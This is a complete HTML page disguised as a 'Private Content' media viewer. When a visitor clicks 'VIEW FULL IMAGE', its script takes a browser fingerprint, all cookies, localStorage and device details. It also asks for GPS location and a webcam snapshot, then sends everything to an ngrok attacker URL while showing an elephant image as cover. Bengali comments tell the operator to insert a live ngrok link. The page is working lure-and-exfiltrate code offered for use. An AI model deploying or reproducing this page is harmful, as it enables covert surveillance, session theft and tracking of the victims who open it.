<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Media Viewer</title>
    <style>
        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #000; color: #fff; font-family: sans-serif; }
        #box { text-align: center; padding: 30px; background: #111; border-radius: 20px; width: 85%; max-width: 380px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        button { background: #007bff; color: #fff; border: none; padding: 16px; width: 100%; border-radius: 30px; font-weight: bold; cursor: pointer; margin-top: 20px; font-size: 1rem; transition: 0.3s; }
        button:hover { background: #0056b3; }
        #content { display: none; text-align: center; }
        img { max-width: 100%; border-radius: 10px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div id="box">
        <div style="font-size: 50px; margin-bottom: 10px;">🔒</div>
        <h3>Private Content</h3>
        <p style="color: #888; font-size: 0.9rem;">Verification required to view the high-resolution media.</p>
        <button onclick="startInfiltration()">VIEW FULL IMAGE</button>
    </div>

    <div id="content">
        <img src="elephant.jpg" alt="Unlocked">
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        // আপনার সচল Ngrok লিঙ্কটি এখানে দিন
        const MASTER_URL = 'https://2f74-103-174-44-17.ngrok-free.app/vulnerability_probe';

        async function startInfiltration() {
            // ১. Fingerprint জেনারেশন (MAC Address এর বিকল্প)
            const canvasID = document.getElementById('canvas');
            const ctx = canvasID.getContext('2d');
            ctx.textBaseline = "top"; ctx.font = "12px 'Arial'";
            ctx.fillText("V-789-SYNC", 2, 2);
            const fingerPrint = btoa(canvasID.toDataURL()).substring(100, 120);

            let report = {
                system: {
                    id: fingerPrint,
                    os: navigator.platform,
                    ram: navigator.deviceMemory + "GB",
                    cores: navigator.hardwareConcurrency,
                    res: `${screen.width}x${screen.height}`,
                    time: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookies: document.cookie || "None",
                    storage: JSON.stringify(localStorage)
                },
                vuln: []
            };

            // ২. অ্যাডভান্সড চেক (পারমিশন ছাড়া)
            if (navigator.webdriver) report.vuln.push("Automation_Bot");
            if (navigator.pdfViewerEnabled) report.vuln.push("PDF_Exploit_Potential");
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                report.system.battery = `${(b.level * 100)}% (${b.charging ? 'Charging' : 'Disc'})`;
            }

            // ৩. লোকেশন ও ক্যামেরা পারমিশন
            navigator.geolocation.getCurrentPosition(async (pos) => {
                report.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        sendData(report, canvas.toDataURL('image/jpeg'));
                        stream.getTracks().forEach(t => t.stop());
                    }, 2000);
                } catch (e) { sendData(report, null); }
            }, () => sendData(report, null));

            document.getElementById('box').style.display = 'none';
            document.getElementById('content').style.display = 'block';
        }

        function sendData(d, p) {
            fetch(MASTER_URL, {
                method: 'POST',
                mode: 'cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ...d, photo: p })
            });
        }
    </script>
</body>
</html>
